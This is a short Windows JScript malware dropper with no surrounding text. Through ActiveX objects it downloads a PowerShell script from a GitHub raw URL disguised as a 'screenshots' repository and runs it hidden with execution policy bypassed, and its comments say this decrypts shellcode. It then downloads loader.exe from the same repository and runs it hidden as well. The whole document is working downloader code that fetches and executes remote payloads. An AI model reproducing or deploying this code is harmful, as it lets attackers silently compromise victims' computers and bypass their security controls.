var sh=new ActiveXObject("WScript.Shell");
var fso=new ActiveXObject("Scripting.FileSystemObject");
var x=new ActiveXObject("MSXML2.XMLHTTP");
// Step 1: decrypt shellcode
x.open("GET","https://raw.githubusercontent.com/cem324/screenshots/main/y1.ps1",0);
x.send();
var t1=fso.GetSpecialFolder(2)+"\\y1.ps1";
fso.CreateTextFile(t1).Write(x.responseText);
sh.Run("powershell -ExecutionPolicy Bypass -File \""+t1+"\"",0);
// Wait for dec.bin
for(var i=0;i<30;i++){try{if(fso.FileExists("C:\\temp\\dec.bin")){break;}}catch(e){}}
// Step 2: download loader.exe
x.open("GET","https://raw.githubusercontent.com/cem324/screenshots/main/loader.exe",0);
x.send();
var t2=fso.GetSpecialFolder(2)+"\\l.exe";
var s=x.responseBody;
var adodb=new ActiveXObject("ADODB.Stream");
adodb.Type=1;adodb.Open();adodb.Write(s);adodb.SaveToFile(t2,2);adodb.Close();
// Step 3: execute loader
sh.Run(t2,0);
